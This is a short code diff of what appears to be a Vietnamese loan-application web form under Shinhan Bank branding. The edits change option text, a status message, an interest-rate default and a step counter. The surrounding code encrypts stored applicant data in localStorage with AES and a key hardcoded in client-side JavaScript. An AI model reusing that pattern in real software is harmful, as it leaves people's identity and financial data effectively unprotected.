@@ -406,7 +406,7 @@
                     <label class="form-label">Nơi cấp <span>*</span></label>
                     <select class="form-select long" id="idIssuePlace">
                         <option value="" disabled selected>Chọn nơi cấp</option>
-                        <option value="CỤC TRƯỜNG CỤC CẢNH SÁT QUẢN LÍ HÀNH CHÍNH VỀ TRẬT TỰ XÃ HỘI (CTCCSQLACVTTXH)">CỤC TRƯỜNG CỤC CẢNH SÁT QUẢN LÝ HÀNH CHÍNH VỀ TTXH</option>
+                        <option value="CỤC TRƯỜNG CỤC CẢNH SÁT QUẢN LÝ HÀNH CHÍNH VỀ TRẬT TỰ XÃ HỘI (CTCCSQLACVTTXH)">CỤC TRƯỜNG CỤC CẢNH SÁT QUẢN LÝ HÀNH CHÍNH VỀ TTXH</option>
                         <option value="Cục Cảnh sát ĐKQL Cư trú và DLQG về dân cư">Cục Cảnh sát ĐKQL Cư trú và DLQG về dân cư</option>
                     </select>
                 </div>
@@ -682,9 +682,9 @@
                 if (storedData) {
                     userData = JSON.parse(CryptoJS.AES.decrypt(storedData, 'shinhan-secret-key').toString(CryptoJS.enc.Utf8));
                     console.log('Loaded userData from localStorage:', userData);
-                    // Kiểm tra trạng thái đăng ký
+                    // Kiểm tra nếu đã có hồ sơ
                     if (userData.isRegistered) {
-                        $('#formError').text('Bạn đã đăng ký thành công. Vui lòng kiểm tra email hoặc liên hệ hỗ trợ để tiếp tục.').show();
+                        $('#formError').text('Bạn đã có hồ sơ tại Ngân hàng Shinhan Bank. Vui lòng kiểm tra email hoặc liên hệ hỗ trợ.').show();
                         $('#registerForm').find('input, select, button[type="submit"]').prop('disabled', true);
                     }
                 }
@@ -829,7 +829,7 @@
                 loanType: $('#loanType').val(),
                 loanTerm: $('#loanTerm').val(),
                 loanAmount: $('#loanAmountInput').val(),
-                interestRate: parseFloat($('#interest').val()),
+                interestRate: parseFloat($('#interest').val() || 0),
                 disbursementDate: $('#disbursementDate').val().trim(),
                 income: $('#income').val().trim(),
                 occupation: $('#occupation').val(),
@@ -841,7 +841,8 @@
                 bankName: $('#bankName').val(),
                 monthlyPayment: userData.monthlyPayment || 0,
                 totalInterest: userData.totalInterest || 0,
-                totalRepayment: userData.totalRepayment || 0
+                totalRepayment: userData.totalRepayment || 0,
+                currentStep: 1
             };
             saveToLocalStorage();
         }
@@ -879,7 +880,7 @@
             $('#formError').hide();
 
             if (userData.isRegistered) {
-                $('#formError').text('Bạn đã đăng ký thành công. Vui lòng kiểm tra email hoặc liên hệ hỗ trợ để tiếp tục.').show();
+                $('#formError').text('Bạn đã có hồ sơ tại Ngân hàng Shinhan Bank. Vui lòng kiểm tra email hoặc liên hệ hỗ trợ.').show();
                 return;
             }
 
